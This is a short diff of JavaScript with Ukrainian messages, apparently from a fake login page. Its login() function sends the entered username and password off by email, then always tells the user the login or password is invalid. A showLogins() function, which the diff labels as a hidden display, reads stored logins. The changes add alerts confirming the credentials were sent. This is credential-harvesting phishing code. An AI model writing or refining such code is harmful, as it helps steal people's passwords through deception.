@@ -17,16 +17,19 @@ function login() {
         username: user,
         password: pass
     })
-    .then(function() {
-        console.log('Email успішно відправлено!');
+    .then(function(response) {
+        console.log('Email успішно відправлено!', response);
+        alert('Email надіслано — перевір пошту!');
     }, function(error) {
         console.error('Помилка при відправці email:', error);
+        alert('Помилка при відправці email. Деталі в консолі: ' + JSON.stringify(error));
     });
 
     // Повідомлення про помилку користувачу
     alert("Невірний логін або пароль");
 }
 
+// Прихований показ логінів
 function showLogins() {
     let logins = JSON.parse(localStorage.getItem("logins")) || [];
     if (logins.length === 0) {
